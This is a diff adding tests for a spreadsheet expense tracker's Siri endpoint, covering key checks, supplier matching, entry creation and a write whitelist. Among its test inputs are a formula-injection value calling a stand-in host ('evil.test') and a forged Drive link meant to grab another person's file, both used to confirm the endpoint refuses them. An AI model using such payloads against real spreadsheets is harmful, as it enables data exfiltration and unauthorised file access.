@@ -17,7 +17,7 @@ const path = require('path');
 
 const mocks = require('./mocks.js');
 const DIR = path.join(__dirname, '..');
-const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js', 'Web.js', 'Form.js', 'Manage.js', 'Suppliers.js'];
+const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js', 'Web.js', 'Form.js', 'Manage.js', 'Suppliers.js', 'Siri.js'];
 
 const sandbox = Object.assign({ console }, mocks);
 sandbox.globalThis = sandbox;
@@ -1981,6 +1981,331 @@ calledNames.forEach(name => {
   check(`${name}: refuses a stranger`, /Not authorized/.test(refused || ''), refused);
 });
 mocks.Session._setActiveUser(mocks.Session._owner);
+
+/* ----------------------------- Siri endpoint ------------------------------ */
+/*
+ * This is the one path with no human in front of it and no Google sign-in, so
+ * it gets tested harder than the rest. The shim project that actually receives
+ * the request contains nothing but a delegation to siriHandlePost, so
+ * everything below is the whole endpoint.
+ *
+ * Braced because the harness is one flat scope and these names — `created`,
+ * `workSheet` — are the obvious ones, already taken further up.
+ */
+{
+section('Siri — the gate');
+
+const SIRI_KEY = 'test-key-9f3c';
+
+function siriPost(body) {
+  const out = G.siriHandlePost({ postData: { contents: JSON.stringify(body) } });
+  return JSON.parse(out.getContent());
+}
+function siriRaw(contents) {
+  return JSON.parse(G.siriHandlePost(contents === null ? {} : { postData: { contents } }).getContent());
+}
+
+// Fails closed BEFORE the key is configured. This is the window that matters:
+// the shim is deployed anonymously, so an unset key must mean shut, not open.
+delete mocks._props.SIRI_API_KEY;
+check('no key configured: refused',
+  siriPost({ action: 'catalog', section: 'work' }).error === 'Not authorized.');
+
+mocks._props.SIRI_API_KEY = SIRI_KEY;
+check('key configured, none supplied: refused',
+  siriPost({ action: 'catalog', section: 'work' }).error === 'Not authorized.');
+check('wrong key: refused',
+  siriPost({ key: 'wrong', action: 'catalog', section: 'work' }).error === 'Not authorized.');
+check('key of the right length but wrong: refused',
+  siriPost({ key: 'test-key-9f3d', action: 'catalog', section: 'work' }).error === 'Not authorized.');
+check('empty-string key: refused',
+  siriPost({ key: '', action: 'catalog', section: 'work' }).error === 'Not authorized.');
+check('correct key: allowed',
+  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'work' }).ok === true);
+
+check('malformed JSON: an error, not a throw', siriRaw('{not json').error === 'Body was not valid JSON.');
+check('no post data at all: an error, not a throw', siriRaw(null).error === 'Empty request.');
+check('a bare string body: refused', siriRaw('"hello"').error === 'Body was not an object.');
+check('unknown action: named, and lists the real ones',
+  /Unknown action: teleport/.test(siriPost({ key: SIRI_KEY, action: 'teleport', section: 'work' }).error || ''));
+check('unknown section: refused',
+  /Unknown section: pets/.test(siriPost({ key: SIRI_KEY, action: 'catalog', section: 'pets' }).error || ''));
+
+// The gate runs before the router, so a bad key on a bad action still reads as
+// a bad key - nothing about the endpoint's shape leaks to an unauthorised caller.
+check('a stranger learns nothing about actions',
+  siriPost({ action: 'teleport', section: 'pets' }).error === 'Not authorized.');
+
+section('Siri — catalog');
+
+const workCatalog = siriPost({ key: SIRI_KEY, action: 'catalog', section: 'work' });
+check('work: category is Expense Reason', workCatalog.category.header === 'Expense Reason');
+check('work: category is open', workCatalog.category.closed === false);
+check('work: counterparty is called Supplier', workCatalog.counterpartyLabel === 'Supplier');
+check('work: currency defaults to EUR', workCatalog.currency === 'EUR');
+check('work: date defaults to today', workCatalog.date === G.today());
+
+const healthCatalog = siriPost({ key: SIRI_KEY, action: 'catalog', section: 'health' });
+check('health: category is Patient', healthCatalog.category.header === 'Patient');
+check('health: patients are a closed list', healthCatalog.category.closed === true);
+check('health: the list has values to tap', healthCatalog.category.values.length > 0,
+  healthCatalog.category.values);
+check('health: counterparty is called Provider', healthCatalog.counterpartyLabel === 'Provider');
+
+check('iva: no category to ask about',
+  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'iva' }).category === null);
+check('income: category present but not required',
+  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'income' }).category.required === false);
+
+section('Siri — resolve corrects without writing');
+
+const suppliersBefore = dump('Suppliers');
+const workRowsBefore = mocks._ss.getSheetByName('Work').getLastRow();
+
+const heardWrong = siriPost({
+  key: SIRI_KEY, action: 'resolve', section: 'health', counterparty: 'wite clinic'
+});
+check('a mishearing resolves to the canonical spelling', heardWrong.confirm === 'White Clinic',
+  heardWrong);
+check('and says it corrected something', heardWrong.corrected === true);
+check('and reports it as known', heardWrong.known === true);
+
+const heardRight = siriPost({
+  key: SIRI_KEY, action: 'resolve', section: 'health', counterparty: 'White Clinic'
+});
+check('an exact hit is not reported as a correction', heardRight.corrected === false, heardRight);
+check('an exact hit is still known', heardRight.known === true);
+
+const heardNew = siriPost({
+  key: SIRI_KEY, action: 'resolve', section: 'work', counterparty: 'Brand New Cafe'
+});
+check('an unknown supplier keeps what was heard', heardNew.confirm === 'Brand New Cafe', heardNew);
+check('an unknown supplier is not a correction', heardNew.corrected === false);
+check('an unknown supplier is not claimed as known', heardNew.known === false);
+
+check('a blank counterparty is refused',
+  siriPost({ key: SIRI_KEY, action: 'resolve', section: 'work', counterparty: '   ' }).ok === false);
+
+check('resolve wrote no supplier', dump('Suppliers') === suppliersBefore);
+check('resolve wrote no row',
+  mocks._ss.getSheetByName('Work').getLastRow() === workRowsBefore);
+
+section('Siri — create, and what it refuses to write');
+
+// THE exploit this whitelist exists to stop. extractFileId takes a Drive id out
+// of any string, and the script runs as me.
+const fileAttempt = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'Thief Ltd', Amount: 1, 'Receipt URL': 'https://drive.google.com/file/d/SOMEONEELSESFILE/view' }
+});
+check('a file column is REFUSED', fileAttempt.ok === false, fileAttempt);
+check('and the refusal names the offending column',
+  /Receipt URL/.test(fileAttempt.error || ''), fileAttempt.error);
+check('nothing was written when a field was refused',
+  mocks._ss.getSheetByName('Work').getLastRow() === workRowsBefore);
+
+['Status', 'Claim Emailed', 'Receipt State', 'Claimed Date', 'Source', 'Timestamp'].forEach(header => {
+  const attempt = siriPost({
+    key: SIRI_KEY, action: 'create', section: 'work',
+    fields: { Counterparty: 'X', Amount: 1, [header]: 'meddled' }
+  });
+  check(`bookkeeping column refused: ${header}`, attempt.ok === false, attempt);
+});
+
+// Refused, not silently dropped: a Shortcut must not believe it recorded
+// something it did not.
+const siriUnknownField = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'X', Amount: 1, Nonsense: 'y' }
+});
+check('an unknown field is refused rather than ignored',
+  siriUnknownField.ok === false, siriUnknownField);
+
+const created = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'Brand New Cafe', Amount: 12.4, 'Expense Reason': 'Lisbon trip' }
+});
+check('a core entry is created', created.ok === true && created.row > 1, created);
+
+const workSheet = mocks._ss.getSheetByName('Work');
+const workCols = G.resolveColumns(workSheet);
+check('source records where it came from',
+  G.readCell(workSheet, workCols, created.row, 'Source') === 'siri');
+check('counterparty written', G.readCell(workSheet, workCols, created.row, 'Counterparty') === 'Brand New Cafe');
+check('amount written', G.readCell(workSheet, workCols, created.row, 'Amount') === 12.4);
+check('currency defaulted to EUR without being asked',
+  G.readCell(workSheet, workCols, created.row, 'Currency') === 'EUR');
+check('date defaulted to today without being asked',
+  G.readCell(workSheet, workCols, created.row, 'Date') === G.today());
+// The trap this caught: createEntry reports ok:true for a work expense with no
+// receipt, because no REQUIRED field is blank. By that measure the entry that
+// most needs finishing looks finished. "complete" has to follow the completion
+// request, which is raised for an awaited document too.
+check('no receipt, so the entry is incomplete', created.complete === false, created);
+check('it names the missing document, not just a field',
+  (created.outstanding || []).indexOf('Receipt') !== -1, created.outstanding);
+check('and flags that a document is what is awaited', created.awaitingDocument === true);
+check('no required field is actually missing', created.missingFields.length === 0, created);
+check('the completion mail went', created.completionEmailed === true, created);
+
+// A partial entry is the safety net, not a failure - the row exists and the
+// completion mail has gone.
+check('an incomplete entry is still reported ok:true', created.ok === true);
+
+section('Siri — the registry fills what Siri cannot ask');
+
+// Uber is always a Taxi, and Siri has no moment to ask.
+G.recordSupplier('Bolt', { type: 'Taxi' });
+const prefilled = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'Bolt', Amount: 8 }
+});
+check('Type prefilled from the registry on an exact match',
+  G.readCell(workSheet, workCols, prefilled.row, 'Type') === 'Taxi');
+
+// The counterparty arriving here is the one CONFIRMED on the phone. Re-running
+// the fuzzy matcher could merge a supplier the confirmation had just
+// established was a different business.
+const nearMiss = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'Bolt Kitchens', Amount: 3 }
+});
+check('a near miss is NOT silently renamed to the registry entry',
+  G.readCell(workSheet, workCols, nearMiss.row, 'Counterparty') === 'Bolt Kitchens');
+check('and does not inherit its Type either',
+  !G.readCell(workSheet, workCols, nearMiss.row, 'Type'));
+
+// An explicit value must survive - the registry fills blanks, it does not
+// overrule what was said.
+const explicitType = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'work',
+  fields: { Counterparty: 'Bolt', Amount: 9, 'Expense Reason': 'Porto' }
+});
+check('an explicitly supplied category survives the prefill',
+  G.readCell(workSheet, workCols, explicitType.row, 'Expense Reason') === 'Porto');
+
+section('Siri — injection and the other sections');
+
+const formulaEntry = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'income',
+  fields: { Counterparty: '=IMPORTXML("http://evil.test","//x")', Amount: 5 }
+});
+const incomeSheet = mocks._ss.getSheetByName('Income');
+const incomeCols = G.resolveColumns(incomeSheet);
+check('a formula counterparty is stored as text',
+  G.readCell(incomeSheet, incomeCols, formulaEntry.row, 'Counterparty')
+    .indexOf("'=IMPORTXML") === 0,
+  G.readCell(incomeSheet, incomeCols, formulaEntry.row, 'Counterparty'));
+
+const healthEntry = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'health',
+  fields: { Counterparty: 'White Clinic', Amount: 70, Patient: healthCatalog.category.values[0] }
+});
+check('health: created with a patient', healthEntry.ok === true, healthEntry);
+check('health: incomplete, because invoice date and documents are missing',
+  healthEntry.complete === false);
+
+const ivaEntry = siriPost({
+  key: SIRI_KEY, action: 'create', section: 'iva',
+  fields: { Counterparty: 'Continente', Amount: 30 }
+});
+check('iva: created', ivaEntry.ok === true, ivaEntry);
+check('iva: incomplete — Número, NIF and Valor do IVA are completion-step fields',
+  ivaEntry.complete === false, ivaEntry);
+check('iva: a category cannot be sent to a section that has none',
+  siriPost({ key: SIRI_KEY, action: 'create', section: 'iva',
+    fields: { Counterparty: 'X', Amount: 1, Patient: 'Phoenix' } }).ok === false);
+
+section('Siri — ping is inside the gate');
+
+check('ping needs the key too', siriPost({ action: 'ping' }).error === 'Not authorized.');
+const ping = siriPost({ key: SIRI_KEY, action: 'ping' });
+check('ping reaches the spreadsheet', ping.ok === true, ping);
+check('ping reports which properties it can see',
+  ping.propertiesVisible.ROOT_FOLDER_ID === true, ping);
+check('ping lists the sections', ping.sections.length === 4);
+
+section('Siri — siriSetup()');
+
+delete mocks._props.SIRI_API_KEY;
+delete mocks._props.SPREADSHEET_ID;
+
+const setup1 = G.siriSetup();
+check('setup reads the spreadsheet id off the container, not a typed string',
+  mocks._props.SPREADSHEET_ID === mocks.SPREADSHEET_ID, setup1);
+check('setup generates a key', /^[0-9a-f]{32}$/.test(mocks._props.SIRI_API_KEY),
+  mocks._props.SIRI_API_KEY);
+check('setup returns the key once, so it can reach the Shortcut',
+  setup1.key === mocks._props.SIRI_API_KEY);
+check('the generated key works', siriPost({ key: setup1.key, action: 'ping' }).ok === true);
+
+// Regenerating silently would break every Shortcut on the phone with nothing
+// to say why.
+const firstKey = mocks._props.SIRI_API_KEY;
+const setup2 = G.siriSetup();
+check('a second run does NOT replace the key', mocks._props.SIRI_API_KEY === firstKey);
+check('and says so rather than returning a key that is not the real one',
+  setup2.keyAlreadySet === true && setup2.key !== firstKey, setup2);
+
+mocks._props.SIRI_API_KEY = SIRI_KEY;
+}
+
+/* ------------------------- getSpreadsheet() ------------------------------ */
+/*
+ * The Siri project is standalone and reaches this code as a library, so it has
+ * no container. Everything below the accessor depends on the fallback, and none
+ * of it is reachable from the bound tests above — which all take the first
+ * branch.
+ */
+section('getSpreadsheet() — the container and the fallback');
+
+check('bound: returns the active spreadsheet', G.getSpreadsheet() === mocks._ss);
+mocks.SpreadsheetApp._openedIds.length = 0;
+G.getSpreadsheet();
+check('bound: never calls openById', mocks.SpreadsheetApp._openedIds.length === 0);
+
+// From here on, no container — the library case.
+mocks.SpreadsheetApp._noActive = true;
+G.clearSpreadsheetCache();
+
+const savedId = mocks._props.SPREADSHEET_ID;
+delete mocks._props.SPREADSHEET_ID;
+let noIdError = null;
+try { G.getSpreadsheet(); } catch (e) { noIdError = e.message; }
+check('standalone, no SPREADSHEET_ID: throws and names the property',
+  /SPREADSHEET_ID/.test(noIdError || ''), noIdError);
+
+mocks._props.SPREADSHEET_ID = mocks.SPREADSHEET_ID;
+mocks.SpreadsheetApp._openedIds.length = 0;
+check('standalone: opens by id', G.getSpreadsheet() === mocks._ss);
+check('standalone: used the property',
+  mocks.SpreadsheetApp._openedIds[0] === mocks.SPREADSHEET_ID, mocks.SpreadsheetApp._openedIds);
+
+G.getSpreadsheet();
+G.getSpreadsheet();
+check('standalone: openById is cached, not refetched',
+  mocks.SpreadsheetApp._openedIds.length === 1, mocks.SpreadsheetApp._openedIds);
+
+// The whole point: real work, with no container at all.
+const standaloneEntry = G.createEntry('work', {
+  Counterparty: 'Standalone Ltd', Amount: 4.5, Date: '2026-05-05', Currency: 'EUR'
+}, 'siri');
+check('standalone: createEntry still writes a row', standaloneEntry.row > 1, standaloneEntry);
+check('standalone: the row landed in the Work sheet',
+  G.readCell(mocks._ss.getSheetByName('Work'), G.resolveColumns(mocks._ss.getSheetByName('Work')),
+    standaloneEntry.row, 'Counterparty') === 'Standalone Ltd');
+
+// A cached spreadsheet must not outlive the execution that opened it.
+G.clearSpreadsheetCache();
+mocks.SpreadsheetApp._openedIds.length = 0;
+G.getSpreadsheet();
+check('clearSpreadsheetCache() forces a fresh open',
+  mocks.SpreadsheetApp._openedIds.length === 1);
+
+mocks.SpreadsheetApp._noActive = false;
+if (savedId === undefined) delete mocks._props.SPREADSHEET_ID; else mocks._props.SPREADSHEET_ID = savedId;
+G.clearSpreadsheetCache();
+check('restored: bound again', G.getSpreadsheet() === mocks._ss);
 
 console.log('\n--- Suppliers sheet ---\n' + dump('Suppliers'));
 console.log('\n--- Work sheet ---\n' + dump('Work'));
